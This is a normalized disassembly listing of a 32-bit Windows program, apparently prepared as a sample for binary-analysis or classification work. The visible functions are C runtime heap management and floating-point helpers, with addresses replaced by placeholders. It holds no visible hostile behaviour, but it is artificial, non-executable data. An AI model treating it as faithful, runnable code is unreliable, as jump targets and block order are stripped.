mov ax [ esi ]
push edi
push [ esp + 0x1c ]
inc esi
inc esi
push eax
call sub_4064ef
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_406586
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4044f2
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push [ ebp + 0x8 ]
call sub_405bdc
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_406e78
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jbe r-xdata
mov eax edi
jmp r-xdata
push esi
call sub_406c43
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push esi
call sub_406c43
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
push 0x1
pop esi
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_407bd3
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
mov edi [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_407681
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_406c43
test eax eax
pop ecx
jne r-xdata
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
cmp esi [ rw-data ]
jae r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
test edi edi
jne r-xdata
push esi
call sub_4071cc
mov edi eax
pop ecx
test edi edi
je r-xdata
jmp r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edi esi
shr edi 0x4
push edi
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_407f9b
add esp 0x10
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb r-xdata
push edi
call sub_407c6f
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push ecx
push edi
call sub_404860
push [ ebp + 0x8 ]
push ebx
call sub_406ea3
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_404860
push ebx
call sub_406e78
push [ ebp + 0x8 ]
mov ebx eax
push ebx
call sub_406ea3
add esp 0x18
mov eax esi
push eax
push [ ebp + 0x8 ]
push edi
call sub_404860
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_407c2a
add esp 0x18
jmp r-xdata
mov eax esi
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push [ ebp + 0x8 ]
push edi
call sub_404860
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_407c2a
add esp 0x18
mov eax esi
sub_406826
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push esi
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_406e78
test eax eax
pop ecx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_407bd3
add esp 0xc
test eax eax
je r-xdata
push esi
jmp r-xdata
mov eax [ esi - 0x4 ]
sub eax 0x9
jmp r-xdata
movzx eax [ eax ]
shl eax 0x4
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop esi
leave
retn
sub_406890
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx rw-data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_406aa5
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_406b35
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_406bf0
pop edx
retn
call sub_406c07
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_406bf0
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_40af4a
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_406c07
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_40af4a
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_406c43
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_406c5e
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_406c8b
push ebp
mov ebp esp
mov eax 0x122c
call sub_40b3d0
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_406c5e
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_40b390
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_40b310
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_40b250
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_40b01a
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_406dd3
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_406c8b
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_406e30
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_407977
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_406e30
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_406e78
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_406ea3
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_409eb0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4071cc
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_407586
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4074d5
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4074d5
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_407586
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_407681
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
